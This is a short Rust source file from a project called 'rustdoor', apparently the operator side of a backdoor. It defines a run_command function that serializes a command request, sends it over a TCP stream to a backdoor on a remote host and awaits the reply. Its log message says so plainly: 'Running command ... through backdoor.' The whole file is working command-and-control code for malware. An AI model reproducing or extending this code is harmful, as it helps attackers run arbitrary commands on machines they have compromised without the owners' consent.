
use rustdoor::communication::messages::{
    RunCommandRequest
};
use std::io::{Error, Write};
use std::net::TcpStream;

use crate::commanding::get_response;
use rustdoor::communication::serialization::serialize_message;

pub fn run_command(command: String, mut stream: &mut TcpStream) -> Result<(), Error> {
    println!("Running command {} through backdoor.", command);
    let req = RunCommandRequest {
        command,
        async_run: false,
    };
    let msg = serialize_message(req).unwrap();

    println!("Sending buffer {:?}", msg);
    stream.write_all(&msg).unwrap();
    println!("Sent message, awaiting reply...");

    let _response = get_response(&mut stream);

    Ok(())
}
